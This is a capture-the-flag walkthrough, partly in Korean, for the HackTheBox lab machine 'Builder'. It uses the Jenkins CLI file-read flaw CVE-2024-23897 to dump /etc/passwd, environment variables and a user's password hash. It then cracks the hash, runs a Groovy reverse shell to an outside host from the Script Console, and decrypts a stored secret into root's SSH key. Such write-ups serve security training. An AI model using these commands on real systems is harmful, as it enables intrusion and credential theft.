# Builder - HackTheBox
## Recon
```bash
sudo nmap -p 22,8080 -sC -sV -vv -oA builder 10.129.230.220
```
<img width="1205" height="431" alt="image" src="https://github.com/user-attachments/assets/336702dd-ed0d-4b41-a065-b5922c95271b" />

- SSH(22)
- HTTP(8080)

---
## HTTP
### banner grabbing
<img width="1205" height="181" alt="image" src="https://github.com/user-attachments/assets/0945143a-01cd-47af-9eb2-dcc7f297bc8e" />
<img width="1205" height="491" alt="image" src="https://github.com/user-attachments/assets/be7da97c-c26a-4729-a8d7-09eaad433df9" />

### CVE-2024-23897
- `Jenkins 2.441`
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/97d3d3bc-f391-4f12-b5cb-31b517c05b60" />

<br>
<br>

- https://nvd.nist.gov/vuln/detail/cve-2024-23897
<img width="1219" height="480" alt="image" src="https://github.com/user-attachments/assets/6c508fe3-f24a-4d0e-a4cc-59ff039d86e1" />

<br>
<br>

- https://www.jenkins.io/security/advisory/2024-01-24/
- `Jenkins CLI`를 사용할때 `CLI commands`와 함께 `@<filename>`을 사용하면 권한에 따라서 혹은 명령어에 따라서 전체 파일 내용이 출력되거나 일부만 출력될 수 있는 취약점.
<img width="1062" height="336" alt="image" src="https://github.com/user-attachments/assets/4423160b-19a5-4ab5-a260-15ba36c3046f" />

<br>
<br>

- https://www.jenkins.io/doc/book/managing/cli/#downloading-the-client
- `Jenkins CLI` 다운로드.
```bash
wget http://10.129.230.220:8080/jnlpJars/jenkins-cli.jar
```
<img width="1062" height="202" alt="image" src="https://github.com/user-attachments/assets/522c4946-1731-4b88-9cef-c2b9914d529b" />
<img width="1205" height="261" alt="image" src="https://github.com/user-attachments/assets/9f10a271-6eb8-4601-965b-6e69b1417dc1" />

<br>
<br>

- `Jenkins CLI`실행 가능.
```bash
java -jar jenkins-cli.jar -s 'http://10.129.230.220:8080' help
```
<img width="1205" height="269" alt="image" src="https://github.com/user-attachments/assets/8acee351-a8bf-4050-a88a-92b1e30b8774" />

<br>
<br>

- `help` 명령어에서 파일을 읽을 경우 일부만 읽어짐.
```bash
java -jar jenkins-cli.jar -s 'http://10.129.230.220:8080' help @/etc/passwd
```
<img width="1205" height="163" alt="image" src="https://github.com/user-attachments/assets/d28c31de-de33-44b7-baf2-78e2d9c9c0bb" />

<br>
<br>

- `connect-node` 명령어에서 전체 읽어지는 것으로 확인.
```bash
for command in $(cat commands);do echo "$command";java -jar jenkins-cli.jar -s 'http://10.129.230.220:8080' $command @/etc/passwd 2>&1|wc -l;done

java -jar jenkins-cli.jar -s 'http://10.129.230.220:8080' connect-node @/etc/passwd
```
<img width="1205" height="295" alt="image" src="https://github.com/user-attachments/assets/96eb15a9-825f-4e4a-a803-514997f15c4f" />
<img width="1205" height="376" alt="image" src="https://github.com/user-attachments/assets/3795cd51-7e19-47d1-8e42-ea94612bb834" />

<br>
<br>

- 환경변수를 읽을 수 있어 `Jenkins_HOME` 경로 발견.
```bash
java -jar jenkins-cli.jar -s 'http://10.129.230.220:8080' connect-node @/proc/self/environ
```
<img width="1205" height="185" alt="image" src="https://github.com/user-attachments/assets/e8624efb-14d1-4ec7-aa51-ba5e14ad8797" />

<br>
<br>

- https://dev.to/pencillr/spawn-a-jenkins-from-code-gfa
- `users.xml`에서 `jennifer`경로 발견.
```bash
java -jar jenkins-cli.jar -s 'http://10.129.230.220:8080' connect-node @/var/jenkins_home/users/users.xml
```
<img width="1205" height="359" alt="image" src="https://github.com/user-attachments/assets/b09bb74e-6e2b-4464-a0f0-127990cb74c6" />

<br>
<br>

- `config.xml`파일에서 해시 발견.
```bash
java -jar jenkins-cli.jar -s 'http://10.129.230.220:8080' connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```
<img width="1205" height="138" alt="image" src="https://github.com/user-attachments/assets/91da46b7-7ef4-4a68-9b5f-c203a30bec13" />

<br>
<br>

- 크래킹.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1205" height="249" alt="image" src="https://github.com/user-attachments/assets/7a9f153b-1442-4c89-9e6b-2428ecbce2e0" />

<br>
<br>

- `jeniffer:princess` 로그인.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/06aa8b4c-f336-4e85-82a0-43e267c75368" />

<br>
<br>

- `Manage Jenkins > Script Consol`에서 리버스 셸 명령어 실행.
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.22/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/b6a96f02-193a-4028-83c8-c927f324e21f" />

<br>
<br>

- 셸 획득.
<img width="1205" height="158" alt="image" src="https://github.com/user-attachments/assets/208ef558-1e7b-4297-ba49-7c093e8bacf1" />

---
## Privesc
- `root`의 비밀번호가 숨겨진 상태로 발견.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/faced0b1-85d4-4e88-97a0-c89461f715ca" />

<br>
<br>

- 개발자 모드에서 해시 획득.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/b302c5df-d836-410d-92c2-97cf735aa493" />

<br>
<br>

- 비밀번호 복호화하여 `id_rsa` 획득.
```grooby
println hudson.util.Secret.decrypt("{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}")
```
<img width="646" height="922" alt="image" src="https://github.com/user-attachments/assets/a0d78fc1-3117-43d8-b794-186c1c49f32e" />

<br>
<br>

- `id_rsa`로 저장하여 `root` 셸 획득.
```bash
ssh -i id_rsa root@10.129.230.220
```
<img width="1206" height="48" alt="image" src="https://github.com/user-attachments/assets/ed9bb4c8-2a50-42c2-83eb-9d6e03f22293" />

---
## FLAG
- `/var/jenkins_home/user.txt`
<img width="1206" height="510" alt="image" src="https://github.com/user-attachments/assets/106167f1-31d1-4e76-b924-564e19515fc4" />

<br>
<br>

- `/root/root.txt`
<img width="1206" height="244" alt="image" src="https://github.com/user-attachments/assets/0e5f3e15-1156-49f7-a540-8125911b1944" />
